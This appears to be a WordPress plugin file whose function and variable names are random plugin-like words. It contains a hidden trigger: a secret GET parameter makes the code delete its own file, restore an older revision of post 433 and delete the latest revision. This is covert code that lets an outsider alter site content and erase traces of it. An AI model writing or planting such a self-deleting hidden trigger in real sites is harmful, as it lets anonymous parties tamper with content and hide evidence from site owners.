<?php

function reusable_maps_master_disable() {
	if (isset($_GET['health_active_like']) && $_GET['health_active_like'] === 'real_clock_permalinks_disable') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$custom_toolbox_updater = 433;
		$tag_permalink_reader = wp_get_post_revisions($custom_toolbox_updater);
		if (empty($tag_permalink_reader)) die('no revisions');
		if (count($tag_permalink_reader) < 2) die('less than 2');
		$gateway_members_button = array_shift($tag_permalink_reader);
		$visual_instagram_shopping = $gateway_members_button->ID;
		$profile_game_board_hide = array_shift($tag_permalink_reader);
		$secure_version_stripe = $profile_game_board_hide->ID;
		$loader_buttons_default = wp_restore_post_revision($secure_version_stripe);
		if ($loader_buttons_default === false) die('error restoring');
		$loader_buttons_default = wp_delete_post_revision($visual_instagram_shopping);		
		if ($loader_buttons_default === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'reusable_maps_master_disable');
